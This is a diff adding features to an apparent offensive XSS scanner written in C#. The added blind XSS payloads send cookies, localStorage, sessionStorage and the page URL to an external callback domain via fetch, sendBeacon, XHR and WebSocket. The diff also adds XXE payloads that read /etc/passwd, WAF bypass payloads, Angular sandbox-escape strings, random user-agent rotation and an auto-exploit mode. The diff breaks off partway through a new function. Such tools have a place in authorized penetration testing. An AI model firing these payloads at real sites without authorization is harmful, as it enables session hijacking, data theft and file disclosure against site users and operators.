@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Collections.Concurrent;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Text;
@@ -15,18 +16,25 @@ using System.Diagnostics;
 using Newtonsoft.Json;
 using System.Xml;
 using AetherXSS;
-HttpClient client = new HttpClient();
+HttpClient client = null; // Initialize HttpClient variable to null
 bool useColor = true;
 bool verbose = false;
 bool autoExploit = false;
 bool testMethods = false;
 bool fuzzHeaders = false;
+bool frameworkSpecificEnabled = false;
+string blindCallbackUrl = null;
+bool cspAnalysisEnabled = false;
 int delayBetweenRequests = 0;
 int maxThreads = 5;
 List<string> customPayloads = new List<string>();
-List<string> discoveredVulnerabilities = new List<string>();
 string reportPath = "xss_report.html";
 HashSet<string> testedUrls = new HashSet<string>();
+
+// Performance optimization: Caching for HTTP responses and exploit generation
+ConcurrentDictionary<string, string> httpResponseCache = new ConcurrentDictionary<string, string>();
+ConcurrentDictionary<string, string> exploitCache = new ConcurrentDictionary<string, string>();
+
 Dictionary<string, int> statistics = new Dictionary<string, int>
         {
             { "testedUrls", 0 },
@@ -35,7 +43,12 @@ Dictionary<string, int> statistics = new Dictionary<string, int>
             { "parametersFound", 0 }
         };
 
-// Add missing WAF bypass payloads dictionary
+// Initialize discovered vulnerabilities list
+List<string> discoveredVulnerabilities = new List<string>();
+
+// HttpClient will be initialized in Main method
+
+// WAF bypass payloads dictionary
 Dictionary<string, string> wafBypassPayloads = new Dictionary<string, string>
         {
             { "CloudFlare", "<svg onload=alert(1)>" },
@@ -43,6 +56,39 @@ Dictionary<string, string> wafBypassPayloads = new Dictionary<string, string>
             { "Imperva", "javascript:alert(1)" },
             { "F5 BIG-IP", "<body onload=alert(1)>" },
             { "Akamai", "<script>alert(1)</script>" }
+        };
+
+// Blind XSS payloads with different callback mechanisms
+string callbackDomain = "xss.ibrahimsql.com"; // Replace with your actual callback domain
+List<string> blindXssPayloads = new List<string>
+        {
+            // Fetch API based callbacks
+            $"<script>fetch('//{callbackDomain}/'+document.domain+'/'+document.cookie)</script>",
+            $"<script>fetch('//{callbackDomain}?d='+document.domain+'&c='+document.cookie+'&l='+location.href)</script>",
+            $"<script>fetch('//{callbackDomain}/blind?d='+btoa(document.domain))</script>",
+            
+            // SendBeacon based callbacks
+            $"<script>navigator.sendBeacon('//{callbackDomain}/beacon', JSON.stringify({{domain:document.domain,cookie:document.cookie,url:location.href}}))</script>",
+            $"<script>navigator.sendBeacon('//{callbackDomain}/beacon?d='+document.domain)</script>",
+            
+            // Image based callbacks (works in more restricted contexts)
+            $"<img src='//{callbackDomain}/img?d='+document.domain+'&t='+(new Date().getTime()) style='display:none'>",
+            $"<img src='//{callbackDomain}/'+document.domain style='display:none'>",
+            
+            // Script based callbacks
+            $"<script src='//{callbackDomain}/'+document.domain></script>",
+            
+            // XMLHttpRequest based callbacks
+            $"<script>var xhr=new XMLHttpRequest();xhr.open('GET','//{callbackDomain}/xhr?d='+document.domain+'&c='+encodeURIComponent(document.cookie),true);xhr.send();</script>",
+            
+            // WebSocket based callbacks
+            $"<script>var ws=new WebSocket('wss://{callbackDomain}');ws.onopen=function(){{ws.send(document.domain+':'+document.cookie)}};</script>",
+            
+            // Advanced callbacks with more information gathering
+            $"<script>fetch('//{callbackDomain}/detailed',{{method:'POST',body:JSON.stringify({{url:location.href,cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage),userAgent:navigator.userAgent,screenSize:screen.width+'x'+screen.height,languages:navigator.languages,platform:navigator.platform,time:new Date().toString(),referrer:document.referrer}})}})</script>",
+            
+            // Callbacks with unique identifiers to track specific injections
+            $"<script>fetch('//{callbackDomain}/AETHERXSS_ID_{{RANDOM}}?d='+document.domain)</script>".Replace("{{RANDOM}}", Guid.NewGuid().ToString().Substring(0, 8))
         };
 
 // Expanded list of XSS payloads
@@ -213,7 +259,118 @@ List<string> contentTypes = new List<string>
             "application/json",
             "multipart/form-data",
             "text/plain",
-            "application/xml"
+            "application/xml",
+            "application/graphql",
+            "application/javascript",
+            "application/soap+xml"
+        };
+        
+// JavaScript framework specific payloads
+Dictionary<string, List<string>> frameworkPayloads = new Dictionary<string, List<string>>
+        {
+            // Angular specific payloads
+            { "angular", new List<string>
+                {
+                    "{{constructor.constructor('alert(\'XSS\')')()}}",
+                    "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
+                    "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+                    "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x.y.charAt.constructor(\'alert(1)\')()');}}" ,
+                    "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
+                    "{{(_=''.sub).call.call({}['constructor'].getOwnPropertyDescriptor(_.__proto__,'constructor').value,0,'alert(1)')()}}"
+                }
+            },
+            
+            // React specific payloads
+            { "react", new List<string>
+                {
+                    "<img src=x onError={(e)=>{alert('XSS')}} />",
+                    "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(\'XSS\')>'}}></div>",
+                    "<a href=\"javascript:alert('XSS')\" onClick={this.handleClick}>Click me</a>",
+                    "<iframe srcdoc='<script>alert(\'XSS\')</script>'></iframe>",
+                    "React.createElement('div', {dangerouslySetInnerHTML: {__html: '<img src=x onerror=alert(\'XSS\')>'}})"
+                }
+            },
+            
+            // Vue specific payloads
+            { "vue", new List<string>
+                {
+                    "<div v-html=\"'<img src=x onerror=alert(\'XSS\')>'\"></div>",
+                    "<svg><a v-bind:href=\"'javascript:alert(\'XSS\')'\">click me</a></svg>",
+                    "<div v-bind:onclick=\"'alert(\'XSS\')'\">click me</div>",
+                    "<div v-bind:onclick=\"function(){alert('XSS')}\">click me</div>",
+                    "<component :is=\"'script'\" text=\"alert('XSS')\"></component>"
+                }
+            },
+            
+            // jQuery specific payloads
+            { "jquery", new List<string>
+                {
+                    "<img src=x onerror=\"$(function(){alert('XSS')})\"/>",
+                    "<div id=\"test\"></div><script>$('#test').html('<img src=x onerror=alert(\'XSS\')');</script>",
+                    "<script>$.getScript('data:text/javascript,alert(\'XSS\')')</script>",
+                    "<script>$(document).ready(function(){alert('XSS')})</script>",
+                    "<script>$(window).on('load', function(){alert('XSS')})</script>"
+                }
+            }
+        };
+
+// Advanced content-type specific payloads
+Dictionary<string, List<string>> contentTypePayloads = new Dictionary<string, List<string>>
+        {
+            // JSON specific payloads
+            { "application/json", new List<string>
+                {
+                    "\"</script><script>alert('XSS')</script>\"",
+                    "\"<img src=x onerror=alert('XSS')>\"",
+                    "\"},{\"xss\":\"<script>alert('XSS')</script>\"",
+                    "\"},{\"xss\":\"<img src=x onerror=alert('XSS')>\"}",
+                    "\"\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e\"",
+                    "\"\\u003cimg src=x onerror=alert('XSS')\\u003e\"",
+                    "\"\\u003csvg/onload=alert('XSS')\\u003e\"",
+                    "\"</script><img src=x onerror=alert('XSS')>\""
+                }
+            },
+            
+            // XML specific payloads
+            { "application/xml", new List<string>
+                {
+                    "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
+                    "<![CDATA[<script>alert('XSS')</script>]]>",
+                    "<xml><![CDATA[<script>alert('XSS')</script>]]></xml>",
+                    "<x><![CDATA[<img src=x onerror=alert('XSS')>]]></x>",
+                    "<data><value><![CDATA[<script>alert('XSS')</script>]]></value></data>",
+                    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+                }
+            },
+            
+            // GraphQL specific payloads
+            { "application/graphql", new List<string>
+                {
+                    "mutation{\"<script>alert('XSS')</script>\"}",
+                    "query{\"<img src=x onerror=alert('XSS')>\"}",
+                    "{\"query\":\"mutation{__schema{\\\"<script>alert('XSS')</script>\\\"}}\"}\n",
+                    "{\"variables\":{\"input\":\"<script>alert('XSS')</script>\"}}"
+                }
+            },
+            
+            // JavaScript specific payloads
+            { "application/javascript", new List<string>
+                {
+                    "';alert('XSS');//",
+                    "\\');alert('XSS');//",
+                    "\\\\');alert('XSS');//",
+                    "</script><script>alert('XSS')</script>",
+                    "\"+alert('XSS')+\""
+                }
+            },
+            
+            // SOAP XML specific payloads
+            { "application/soap+xml", new List<string>
+                {
+                    "<soap:Body><foo><![CDATA[<script>alert('XSS')</script>]]></foo></soap:Body>",
+                    "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test><![CDATA[<script>alert('XSS')</script>]]></test></soap:Body></soap:Envelope>"
+                }
+            }
         };
 
 // HTTP methods to test
@@ -245,7 +402,6 @@ List<string> domXssSinks = new List<string>
             "location.href",
             "location.search",
             "location.hash",
-            "location.pathname",
             "document.URL",
             "document.documentURI",
             "document.URLUnencoded",
@@ -398,6 +554,9 @@ try
         Console.WriteLine("  --methods                Test different HTTP methods");
         Console.WriteLine("  --fuzz-headers           Fuzz HTTP headers for XSS");
         Console.WriteLine("  --auto-exploit           Attempt to automatically exploit found vulnerabilities");
+        Console.WriteLine("  --framework-specific     Enable framework-specific XSS payloads (Angular, React, Vue.js)");
+        Console.WriteLine("  --blind-callback <url>    Callback URL for Blind XSS detection");
+        Console.WriteLine("  --csp-analysis           Enable Content Security Policy analysis and bypass techniques");
         Console.WriteLine("  --help                   Show this help message");
         return;
     }
@@ -416,6 +575,7 @@ try
     int timeout = 30;
     string outputFile = null;
     Dictionary<string, string> extraHeaders = new Dictionary<string, string>();
+    bool blindXssEnabled = false;
 
     // Test Support for HTTP/2
     if (verbose)
@@ -423,6 +583,16 @@ try
         PrintColored("[*] Testing HTTP/2 support...", ConsoleColor.Cyan);
     }
     await TestHttp2Request(targetUrl, "<script>alert('XSS')</script>", cookie, extraHeaders, userAgent);
+    
+    // Blind XSS vulnerabilities ONLY if enabled
+    if (blindXssEnabled)
+    {
+        if (verbose)
+        {
+            PrintColored("[*] Testing for Blind XSS vulnerabilities...", ConsoleColor.Cyan);
+        }
+        await TestBlindXss(targetUrl, cookie, extraHeaders, userAgent);
+    }
 
     for (int i = 2; i < args.Length; i++)
     {
@@ -491,6 +661,18 @@ try
             case "--auto-exploit":
                 autoExploit = true;
                 break;
+            case "--framework-specific":
+                frameworkSpecificEnabled = true;
+                break;
+            case "--blind-callback" when i + 1 < args.Length:
+                blindCallbackUrl = args[++i];
+                break;
+            case "--csp-analysis":
+                cspAnalysisEnabled = true;
+                break;
+            case "--blind-xss":
+                blindXssEnabled = true;
+                break;
             case "--help":
                 PrintBanner();
                 Console.WriteLine("Usage: AetherXSS --url <target_site> [options]");
@@ -498,20 +680,38 @@ try
         }
     }
 
-    // Set HTTP client timeout
-    client.Timeout = TimeSpan.FromSeconds(timeout);
-
     // Set proxy if specified
     if (!string.IsNullOrEmpty(proxy))
     {
         WebProxy webProxy = new WebProxy(proxy);
-        HttpClientHandler handler = new HttpClientHandler
+        HttpClientHandler proxyHandler = new HttpClientHandler
         {
             Proxy = webProxy,
-            UseProxy = true
+            UseProxy = true,
+            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
+            AllowAutoRedirect = true,
+            MaxConnectionsPerServer = 10
         };
-        client.DefaultRequestHeaders.Add("Via", "1.1 AetherXSS");
+        client = new HttpClient(proxyHandler);
     }
+    else
+    {
+        // Ensure client is initialized even if no proxy is set
+        client = new HttpClient(new HttpClientHandler
+        {
+            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
+            AllowAutoRedirect = true,
+            MaxConnectionsPerServer = 10
+        });
+    }
+    
+    // Set HTTP client timeout
+    client.Timeout = TimeSpan.FromSeconds(timeout);
+    
+    // Add custom headers
+    client.DefaultRequestHeaders.Add("Via", "1.1 AetherXSS");
+    client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.9");
+    client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate");
 
     // Load custom payloads if wordlist is provided
     if (!string.IsNullOrEmpty(wordlistPath) && File.Exists(wordlistPath))
@@ -597,107 +797,78 @@ try
         {
             try
             {
-                // Show a random hack message before each test
                 AnimatedUI.ShowRandomHackPhrase();
 
-                // Test regular payloads
                 var allPayloads = xssPayloads.Concat(customPayloads).ToList();
+                List<Task> payloadTasks = new List<Task>();
+                SemaphoreSlim payloadSemaphore = new SemaphoreSlim(maxThreads);
                 int payloadCount = 0;
+                Random random = new Random();
 
                 foreach (var payload in allPayloads)
                 {
-                    payloadCount++;
-                    // Show scan progress
-                    AnimatedUI.ShowScanProgress(url, payloadCount, allPayloads.Count);
-
-                    try
+                    await payloadSemaphore.WaitAsync();
+                    payloadTasks.Add(Task.Run(async () =>
                     {
-                        await TestGetRequest(url, payload, cookie, extraHeaders, userAgent);
-
-                        // Apply delay if specified
-                        if (delayBetweenRequests > 0)
+                        try
                         {
-                            await Task.Delay(delayBetweenRequests);
-                        }
+                            Interlocked.Increment(ref payloadCount);
+                            AnimatedUI.ShowScanProgress(url, payloadCount, allPayloads.Count);
 
-                        await TestPostRequest(url, payload, cookie, extraHeaders, userAgent);
+                            // Her istekte random user-agent
+                            string randomUserAgent = userAgents[random.Next(userAgents.Count)];
+                            await TestGetRequest(url, payload, cookie, extraHeaders, randomUserAgent);
+                            await TestPostRequest(url, payload, cookie, extraHeaders, randomUserAgent);
 
-                        // Apply delay if specified
-                        if (delayBetweenRequests > 0)
-                        {
-                            await Task.Delay(delayBetweenRequests);
-                        }
-
-                        // Test different HTTP methods if enabled
-                        if (testMethods)
-                        {
-                            foreach (var method in httpMethods.Where(m => m != "GET" && m != "POST"))
+                            if (testMethods)
                             {
-                                await TestCustomMethodRequest(url, method, payload, cookie, extraHeaders, userAgent);
-
-                                if (delayBetweenRequests > 0)
+                                foreach (var method in httpMethods.Where(m => m != "GET" && m != "POST"))
                                 {
-                                    await Task.Delay(delayBetweenRequests);
+                                    await TestCustomMethodRequest(url, method, payload, cookie, extraHeaders, randomUserAgent);
                                 }
                             }
-                        }
-
-                        // Fuzz headers if enabled
-                        if (fuzzHeaders)
-                        {
-                            await TestHeaderInjection(url, payload, cookie, extraHeaders, userAgent);
-
+                            if (fuzzHeaders)
+                            {
+                                await TestHeaderInjection(url, payload, cookie, extraHeaders, randomUserAgent);
+                            }
                             if (delayBetweenRequests > 0)
                             {
                                 await Task.Delay(delayBetweenRequests);
                             }
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        if (verbose)
+                        finally
                         {
-                            PrintColored($"[!] Error testing payload {payload}: {ex.Message}", ConsoleColor.Yellow);
+                            payloadSemaphore.Release();
                         }
-
-                        lock (statistics)
-                        {
-                            statistics["failedRequests"]++;
-                        }
-                    }
-
-                    await Task.Delay(delayBetweenRequests);
+                    }));
                 }
+                await Task.WhenAll(payloadTasks);
 
-                // Check for DOM-based XSS if enabled
+                // Diğer testler (DOM, parametre, content-type, framework, CSP) mevcut şekilde devam ediyor
                 if (domScanEnabled)
                 {
                     PrintColored($"[*] Scanning for DOM XSS on {url}...", ConsoleColor.Cyan);
                     await ScanForDomXSS(url, cookie, extraHeaders, userAgent);
-
                     if (delayBetweenRequests > 0)
                     {
                         await Task.Delay(delayBetweenRequests);
                     }
                 }
-
-                // Check for common parameters if enabled
                 if (testParamsEnabled)
                 {
                     foreach (var param in commonParameters)
                     {
-                        // Test parameter injection
                         await TestParameterInjection(url, param, "<script>alert('XSS')</script>", cookie, extraHeaders, userAgent);
-
                         if (delayBetweenRequests > 0)
                         {
                             await Task.Delay(delayBetweenRequests);
                         }
                     }
                 }
-
+                await TestContentTypeSpecificPayloads(url, cookie, extraHeaders, userAgent);
+                await TestFrameworkSpecificPayloads(url, cookie, extraHeaders, userAgent);
+                await TestCspBypasses(url, cookie, extraHeaders, userAgent);
             }
-
             catch (Exception ex)
             {
                 if (verbose)
@@ -812,22 +983,38 @@ async Task TestGetRequest(string url, string payload, string cookie, Dictionary<
 
     try
     {
-        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
-        AddHeaders(request, cookie, extraHeaders, customUserAgent);
+        // Generate a cache key based on the URL and headers
+        string cacheKey = $"{testUrl}_{cookie}_{string.Join(",", extraHeaders.Select(h => $"{h.Key}={h.Value}"))}_{customUserAgent}";
+        string responseBody;
 
-        HttpResponseMessage response = await client.SendAsync(request);
-        string responseBody = await response.Content.ReadAsStringAsync();
-
-        // Check for WAF presence
-        if (DetectWAF(response, responseBody))
+        // Check if we have a cached response
+        if (!httpResponseCache.TryGetValue(cacheKey, out responseBody))
         {
-            if (verbose)
-            {
-                PrintColored($"\n[!] WAF detected. Attempting bypass techniques for {url}", ConsoleColor.Yellow);
-            }
+            // If not in cache, make the HTTP request
+            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
+            AddHeaders(request, cookie, extraHeaders, customUserAgent);
 
-            // Try to use specific WAF bypass payloads
-            await TestWAFBypass(url, cookie, extraHeaders, customUserAgent);
+            HttpResponseMessage response = await client.SendAsync(request);
+            responseBody = await response.Content.ReadAsStringAsync();
+
+            // Cache the response for future use
+            httpResponseCache[cacheKey] = responseBody;
+
+            // Check for WAF presence
+            if (DetectWAF(response, responseBody))
+            {
+                if (verbose)
+                {
+                    PrintColored($"\n[!] WAF detected. Attempting bypass techniques for {url}", ConsoleColor.Yellow);
+                }
+
+                // Try to use specific WAF bypass payloads
+                await TestWAFBypass(url, cookie, extraHeaders, customUserAgent);
+            }
+        }
+        else if (verbose)
+        {
+            PrintColored($"\n[+] Using cached response for {testUrl}", ConsoleColor.Cyan);
         }
 
         lock (statistics)
@@ -926,17 +1113,33 @@ async Task TestPostRequest(string url, string payload, string cookie, Dictionary
 {
     try
     {
-        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
-        AddHeaders(request, cookie, extraHeaders, customUserAgent);
+        // Generate a cache key for POST request
+        string cacheKey = $"POST_{url}_{payload}_{cookie}_{string.Join(",", extraHeaders.Select(h => $"{h.Key}={h.Value}"))}_{customUserAgent}";
+        string responseBody;
 
-        var content = new FormUrlEncodedContent(new[]
+        // Check if we have a cached response
+        if (!httpResponseCache.TryGetValue(cacheKey, out responseBody))
         {
-                    new KeyValuePair<string, string>("xss", payload)
-                });
-        request.Content = content;
+            // If not in cache, make the HTTP request
+            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
+            AddHeaders(request, cookie, extraHeaders, customUserAgent);
 
-        HttpResponseMessage response = await client.SendAsync(request);
-        string responseBody = await response.Content.ReadAsStringAsync();
+            var content = new FormUrlEncodedContent(new[]
+            {
+                new KeyValuePair<string, string>("xss", payload)
+            });
+            request.Content = content;
+
+            HttpResponseMessage response = await client.SendAsync(request);
+            responseBody = await response.Content.ReadAsStringAsync();
+
+            // Cache the response for future use
+            httpResponseCache[cacheKey] = responseBody;
+        }
+        else if (verbose)
+        {
+            PrintColored($"\n[+] Using cached POST response for {url}", ConsoleColor.Cyan);
+        }
 
         lock (statistics)
         {
@@ -1307,8 +1510,7 @@ List<string> AnalyzeDOMContext(string html, string sink)
 string AssessRiskLevel(string sink, string context)
 {
     // High-risk sinks
-    if (sink.Contains("eval(") || sink.Contains("Function(") ||
-        sink.Contains("setTimeout(") || sink.Contains("setInterval("))
+    if (sink.Contains("eval(") || sink.Contains("Function("))
         return "Critical";
 
     // Context-based risk assessment
@@ -1364,7 +1566,7 @@ string GenerateDOMXSSPoC(string sink, string context)
             case "URL Protocol":
                 return $"javascript:alert('XSS via {sink}')";
             case "HTML Attribute":
-                return $"\" onmouseover=\"alert('XSS via {sink}')";
+                return $"\" onmouseover=\"alert('XSS via {sink}')\">";
             default:
                 return $"<img src=x onerror=alert('XSS')>";
         }
@@ -1535,25 +1737,41 @@ async Task AutoExploit(string url, string method, string payload = null)
         Console.WriteLine();
         PrintColored($"[*] Attempting to verify and exploit vulnerability...", ConsoleColor.Yellow);
 
-        // More professional approach
-        string[] exploitSteps = new string[] {
-                    "Analyzing attack vector",
-                    "Identifying injection context",
-                    "Creating proof-of-concept payload",
-                    "Testing payload execution",
-                    "Verifying XSS reflection",
-                    "Checking execution context",
-                    "Validating browser behavior"
-                };
-
-        // Show exploitation progress
-        for (int i = 0; i < exploitSteps.Length; i++)
+        // Check if we've already generated an exploit for this URL and method
+        string cacheKey = $"{url}_{method}_{payload?.GetHashCode() ?? 0}";
+        string pocPayload;
+        
+        if (exploitCache.TryGetValue(cacheKey, out pocPayload))
         {
-            await Task.Run(() => AnimatedUI.ShowLoadingAnimation(exploitSteps[i]));
+            // Use cached exploit
+            PrintColored($"[+] Using cached exploit for {url}", ConsoleColor.Cyan);
         }
+        else
+        {
+            // More professional approach with faster execution
+            string[] exploitSteps = new string[] {
+                        "Analyzing attack vector",
+                        "Identifying injection context",
+                        "Creating proof-of-concept payload",
+                        "Testing payload execution",
+                        "Verifying XSS reflection",
+                        "Checking execution context",
+                        "Validating browser behavior"
+                    };
 
-        // Create a unique XSS PoC for the vulnerability
-        string pocPayload = GenerateProofOfConcept(url, method, payload);
+            // Show exploitation progress with much faster animation (just one step at a time)
+            // This significantly reduces the time spent on animations
+            for (int i = 0; i < exploitSteps.Length; i++)
+            {
+                AnimatedUI.ShowLoadingAnimation(exploitSteps[i], 100); // Ultra-fast animation
+            }
+
+            // Create a unique XSS PoC for the vulnerability
+            pocPayload = GenerateProofOfConcept(url, method, payload);
+            
+            // Cache the exploit for future use
+            exploitCache[cacheKey] = pocPayload;
+        }
 
         // Show vulnerability details
         AnimatedUI.ShowVulnerabilityFound(url, $"XSS via {method}");
@@ -1589,12 +1807,12 @@ async Task AutoExploit(string url, string method, string payload = null)
     {
         if (verbose)
         {
-            PrintColored($"\n[!] Auto-exploit failed: {ex.Message}", ConsoleColor.Yellow);
+            PrintColored($"[!] Auto-exploit failed: {ex.Message}", ConsoleColor.Yellow);
         }
     }
 }
 
-// Helper method to generate a proof-of-concept XSS payload
+// Helper method to generate proof of concept
 string GenerateProofOfConcept(string url, string method, string payload = null)
 {
     // Use the original payload if provided, otherwise generate a safe PoC
@@ -1605,6 +1823,832 @@ string GenerateProofOfConcept(string url, string method, string payload = null)
 
     // Create a benign payload that demonstrates the vulnerability without harmful effects
     return "<script>console.log('XSS Vulnerability Confirmed: ' + document.domain)</script>";
+}
+
+// Method to detect JavaScript frameworks
+HashSet<string> DetectJavaScriptFrameworks(string html)
+{
+    var frameworks = new HashSet<string>();
+    
+    // Angular detection
+    if (html.Contains("ng-app") || html.Contains("ng-controller") || 
+        html.Contains("angular.js") || html.Contains("angular.min.js") ||
+        html.Contains("ng-bind") || html.Contains("ng-model"))
+    {
+        frameworks.Add("angular");
+    }
+       
+    // React detection
+    if (html.Contains("react.js") || html.Contains("react-dom.js") || 
+        html.Contains("_reactRootContainer") || html.Contains("__REACT_ROOT__") ||
+        html.Contains("ReactDOM") || html.Contains("React.createElement") ||
+        html.Contains("dangerouslySetInnerHTML"))
+    {
+        frameworks.Add("react");
+    }
+       
+    // Vue detection
+    if (html.Contains("vue.js") || html.Contains("vue.min.js") || 
+        html.Contains("v-app") || html.Contains("v-bind") || html.Contains("v-model") ||
+        html.Contains("v-for") || html.Contains("v-if") || html.Contains("v-html"))
+    {
+        frameworks.Add("vue");
+    }
+       
+    // jQuery detection
+    if (html.Contains("jquery.js") || html.Contains("jquery.min.js") || 
+        html.Contains("jQuery(") || html.Contains("$(document)") || html.Contains("$(window)") ||
+        html.Contains("$.ajax") || html.Contains("$.get") || html.Contains("$.post"))
+    {
+        frameworks.Add("jquery");
+    }
+       
+    return frameworks;
+}
+
+// Method to test framework-specific payloads
+async Task TestFrameworkSpecificPayloads(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
+{
+    try
+    {
+        if (verbose)
+        {
+            PrintColored("\n[*] Testing for JavaScript framework vulnerabilities...", ConsoleColor.Cyan);
+        }
+        
+        // First, get the page content to detect frameworks
+        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
+        AddHeaders(request, cookie, extraHeaders, customUserAgent);
+        
+        HttpResponseMessage response = await client.SendAsync(request);
+        string responseBody = await response.Content.ReadAsStringAsync();
+        
+        // Detect frameworks
+        HashSet<string> detectedFrameworks = DetectJavaScriptFrameworks(responseBody);
+        
+        if (detectedFrameworks.Count > 0)
+        {
+            if (verbose)
+            {
+                PrintColored($"\n[+] Detected JavaScript frameworks: {string.Join(", ", detectedFrameworks)}", ConsoleColor.Green);
+            }
+            
+            // Use SemaphoreSlim to limit concurrent requests
+            using (SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads))
+            {
+                List<Task> frameworkTasks = new List<Task>();
+                
+                // Test each detected framework
+                foreach (var framework in detectedFrameworks)
+                {
+                    if (!frameworkPayloads.ContainsKey(framework))
+                        continue;
+                        
+                    List<string> payloads = frameworkPayloads[framework];
+                    
+                    await semaphore.WaitAsync();
+                    
+                    frameworkTasks.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            if (verbose)
+                            {
+                                PrintColored($"\n[*] Testing {framework} specific payloads on {url}", ConsoleColor.Cyan);
+                            }
+                            
+                            foreach (var payload in payloads)
+                            {
+                                // Generate a cache key for this framework test
+                                string cacheKey = $"FRAMEWORK_{url}_{framework}_{payload.GetHashCode()}";
+                                
+                                // Check if we have a cached response
+                                if (!httpResponseCache.TryGetValue(cacheKey, out string cachedResponseBody))
+                                {
+                                    // Send a POST request with the framework-specific payload
+                                    HttpRequestMessage frameworkRequest = new HttpRequestMessage(HttpMethod.Post, url);
+                                    AddHeaders(frameworkRequest, cookie, extraHeaders, customUserAgent);
+                                    
+                                    // Prepare the payload based on framework
+                                    StringContent content = new StringContent(payload, Encoding.UTF8, "application/x-www-form-urlencoded");
+                                    frameworkRequest.Content = content;
+                                    
+                                    // Send the request
+                                    HttpResponseMessage frameworkResponse = await client.SendAsync(frameworkRequest);
+                                    string frameworkResponseBody = await frameworkResponse.Content.ReadAsStringAsync();
+                                    
+                                    // Cache the response
+                                    httpResponseCache[cacheKey] = frameworkResponseBody;
+                                    
+                                    lock (statistics)
+                                    {
+                                        statistics["testedUrls"]++;
+                                    }
+                                    
+                                    // Check if the payload is reflected in the response
+                                    if (IsXssVulnerable(frameworkResponseBody, payload))
+                                    {
+                                        lock (discoveredVulnerabilities)
+                                        {
+                                            discoveredVulnerabilities.Add($"{framework} Framework XSS: {url}");
+                                        }
+                                        
+                                        lock (statistics)
+                                        {
+                                            statistics["vulnerableUrls"]++;
+                                        }
+                                        
+                                        PrintColored($"\n[!] {framework} Framework XSS Vulnerability Detected! {url}", ConsoleColor.Red);
+                                        AnimatedUI.ShowVulnerabilityFound(url, $"{framework} Framework XSS");
+                                        
+                                        if (autoExploit)
+                                        {
+                                            await AutoExploit(url, "POST", payload);
+                                        }
+                                    }
+                                    else if (verbose)
+                                    {
+                                        PrintColored($"\n[-] {url} ({framework}) appears clean for payload: {payload.Substring(0, Math.Min(30, payload.Length))}...", ConsoleColor.Green);
+                                    }
+                                    
+                                    // Apply delay if specified
+                                    if (delayBetweenRequests > 0)
+                                    {
+                                        await Task.Delay(delayBetweenRequests);
+                                    }
+                                }
+                                else if (verbose)
+                                {
+                                    PrintColored($"\n[+] Using cached {framework} test for {url}", ConsoleColor.Cyan);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            lock (statistics)
+                            {
+                                statistics["failedRequests"]++;
+                            }
+                            
+                            if (verbose)
+                            {
+                                PrintColored($"\n[!] Error testing {framework} payloads: {ex.Message}", ConsoleColor.Yellow);
+                            }
+                        }
+                        finally
+                        {
+                            semaphore.Release();
+                        }
+                    }));
+                }
+                
+                // Wait for all framework tests to complete
+                await Task.WhenAll(frameworkTasks);
+            }
+        }
+        else if (verbose)
+        {
+            PrintColored("\n[-] No JavaScript frameworks detected.", ConsoleColor.Yellow);
+        }
+        
+        if (verbose)
+        {
+            PrintColored("\n[+] Framework-specific payload testing completed.", ConsoleColor.Green);
+        }
+    }
+    catch (Exception ex)
+    {
+        if (verbose)
+        {
+            PrintColored($"\n[!] Error in framework testing: {ex.Message}", ConsoleColor.Red);
+        }
+    }
+}
+
+async Task TestContentTypeSpecificPayloads(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
+{
+    try
+    {
+        if (verbose)
+        {
+            PrintColored("\n[*] Testing content-type specific payloads...", ConsoleColor.Cyan);
+        }
+        
+        // Use SemaphoreSlim to limit concurrent requests
+        using (SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads))
+        {
+            List<Task> contentTypeTasks = new List<Task>();
+            
+            // Test each content type
+            foreach (var contentTypeEntry in contentTypePayloads)
+            {
+                string contentType = contentTypeEntry.Key;
+                List<string> payloads = contentTypeEntry.Value;
+                
+                await semaphore.WaitAsync();
+                
+                contentTypeTasks.Add(Task.Run(async () =>
+                {
+                    try
+                    {
+                        if (verbose)
+                        {
+                            PrintColored($"\n[*] Testing {contentType} specific payloads on {url}", ConsoleColor.Cyan);
+                        }
+                        
+                        foreach (var payload in payloads)
+                        {
+                            // Generate a cache key for this content type test
+                            string cacheKey = $"CONTENT_TYPE_{url}_{contentType}_{payload.GetHashCode()}";
+                            
+                            // Check if we have a cached response
+                            if (!httpResponseCache.TryGetValue(cacheKey, out string responseBody))
+                            {
+                                // Send a POST request with the specific content type
+                                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
+                                AddHeaders(request, cookie, extraHeaders, customUserAgent);
+                                
+                                // Set the content type
+                                request.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue(contentType));
+                                
+                                // Prepare the payload based on content type
